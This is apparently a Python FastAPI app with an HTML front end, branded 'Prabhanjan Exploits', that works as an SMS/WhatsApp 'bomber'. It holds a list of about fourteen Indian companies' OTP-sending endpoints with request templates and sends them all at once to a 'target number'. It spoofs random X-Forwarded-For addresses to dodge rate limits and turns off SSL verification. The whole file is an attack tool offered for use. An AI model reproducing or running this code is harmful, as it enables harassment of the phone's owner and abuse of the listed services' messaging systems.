from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import aiohttp
import asyncio
import random

app = FastAPI()

# ============ APIS LIST (Apni poori list yahan paste karo) ============
ULTIMATE_APIS = [
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    # 👆 YAHAN APNI POORI ULTIMATE_APIS LIST PASTE KARO
]

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💥 Prabhanjan Exploits | Ultimate Bomber</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            display: flex; justify-content: center; align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 25px;
            padding: 40px;
            width: 100%; max-width: 450px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
        }
        .logo {
            text-align: center; font-size: 2.2em; font-weight: 900;
            background: linear-gradient(90deg, #ff0080, #ff8c00, #40e0d0);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        .subtitle { text-align: center; color: #aaa; margin-bottom: 30px; font-size: 0.9em; letter-spacing: 2px; }
        .phone-input {
            width: 100%; padding: 18px 20px;
            background: rgba(255,255,255,0.08);
            border: 2px solid transparent;
            border-radius: 15px; color: white;
            font-size: 1.2em; text-align: center;
            outline: none; transition: all 0.3s; margin-bottom: 15px;
        }
        .phone-input:focus { border-color: #ff0080; background: rgba(255,255,255,0.12); }
        .btn-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
        .num-btn {
            padding: 15px; background: rgba(255,255,255,0.08);
            border: none; border-radius: 12px; color: white;
            font-size: 1.1em; cursor: pointer; transition: 0.2s;
        }
        .num-btn:hover { background: rgba(255,255,255,0.2); transform: scale(1.05); }
        .bomb-btn {
            width: 100%; padding: 20px;
            background: linear-gradient(90deg, #ff0080, #ff8c00);
            border: none; border-radius: 15px; color: white;
            font-size: 1.3em; font-weight: bold; cursor: pointer;
            transition: 0.3s; box-shadow: 0 10px 30px rgba(255,0,128,0.4);
        }
        .bomb-btn:hover { transform: scale(1.02); }
        .bomb-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .stats { display: none; margin-top: 25px; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; }
        .stat-row {
            display: flex; justify-content: space-between;
            color: #ccc; padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .stat-row span:last-child { color: #40e0d0; font-weight: bold; }
        .animation { text-align: center; font-size: 3em; display: none; margin: 20px 0; }
        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.3); } }
        .pulse { animation: pulse 0.8s infinite; }
        .footer { text-align: center; margin-top: 25px; color: #666; font-size: 0.8em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">💀 PRABHANJAN EXPLOITS</div>
        <div class="subtitle">⚡ ULTIMATE SMS/WHATSAPP BOMBER ⚡</div>

        <input class="phone-input" id="phone" placeholder="📱 Enter Target Number" maxlength="10" readonly>

        <div class="btn-grid">
            <button class="num-btn" onclick="addNum('1')">1</button>
            <button class="num-btn" onclick="addNum('2')">2</button>
            <button class="num-btn" onclick="addNum('3')">3</button>
            <button class="num-btn" onclick="delNum()">⌫</button>
            <button class="num-btn" onclick="addNum('4')">4</button>
            <button class="num-btn" onclick="addNum('5')">5</button>
            <button class="num-btn" onclick="addNum('6')">6</button>
            <button class="num-btn" onclick="addNum('0')">0</button>
            <button class="num-btn" onclick="addNum('7')">7</button>
            <button class="num-btn" onclick="addNum('8')">8</button>
            <button class="num-btn" onclick="addNum('9')">9</button>
            <button class="num-btn" onclick="clearAll()">C</button>
        </div>

        <button class="bomb-btn" id="bombBtn" onclick="startBomb()">🚀 START BOMBING 🚀</button>

        <div class="animation pulse" id="anim">💥</div>

        <div class="stats" id="stats">
            <h3 style="color:#ff0080; margin-bottom:10px;">📊 BOMBING STATS</h3>
            <div class="stat-row"><span>Total Attacks</span><span id="total">0</span></div>
            <div class="stat-row"><span>Successful Hits</span><span id="success">0</span></div>
            <div class="stat-row"><span>Failed</span><span id="failed">0</span></div>
        </div>

        <div class="footer">⚡ Made with 💔 by Prabhanjan Exploits ⚡</div>
    </div>

    <script>
        function addNum(n) {
            let p = document.getElementById('phone');
            if (p.value.length < 10) p.value += n;
        }
        function delNum() {
            document.getElementById('phone').value =
                document.getElementById('phone').value.slice(0, -1);
        }
        function clearAll() { document.getElementById('phone').value = ''; }

        async function startBomb() {
            const phone = document.getElementById('phone').value;
            if (phone.length !== 10) {
                alert('⚠️ Please enter 10 digit number!');
                return;
            }

            const btn = document.getElementById('bombBtn');
            btn.disabled = true;
            btn.innerHTML = '💀 BOMBING... 💀';
            document.getElementById('anim').style.display = 'block';

            try {
                const res = await fetch('/api/bomb?phone=' + phone);
                const data = await res.json();

                document.getElementById('stats').style.display = 'block';
                document.getElementById('total').innerHTML =
                    (parseInt(document.getElementById('total').innerText) || 0) + data.total;
                document.getElementById('success').innerHTML =
                    (parseInt(document.getElementById('success').innerText) || 0) + data.success;
                document.getElementById('failed').innerHTML =
                    (parseInt(document.getElementById('failed').innerText) || 0) + data.failed;

                document.getElementById('anim').style.display = 'none';
                btn.innerHTML = '✅ DONE! BOMB AGAIN? ✅';
                btn.disabled = false;
            } catch(e) {
                alert('❌ Error: ' + e.message);
                btn.innerHTML = '🚀 START BOMBING 🚀';
                btn.disabled = false;
                document.getElementById('anim').style.display = 'none';
            }
        }
    </script>
</body>
</html>
'''

@app.get("/", response_class=HTMLResponse)
async def home():
    return HTML_TEMPLATE

@app.get("/bomb")
async def bomb(phone: str):
    if not phone.isdigit() or len(phone) != 10:
        return {"error": "Invalid number"}

    result = await run_bomb(phone)
    return result

async def hit_api(session, api, phone):
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = dict(api["headers"])
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        timeout = aiohttp.ClientTimeout(total=8)

        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=timeout, ssl=False) as response:
                return 1 if response.status in [200, 201, 202] else 0
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as response:
                return 1 if response.status in [200, 201, 202] else 0
    except Exception:
        return 0

async def run_bomb(phone):
    stats = {"total": 0, "success": 0, "failed": 0}

    connector = aiohttp.TCPConnector(limit=0, verify_ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    for r in results:
        stats["total"] += 1
        if r == 1:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    return stats
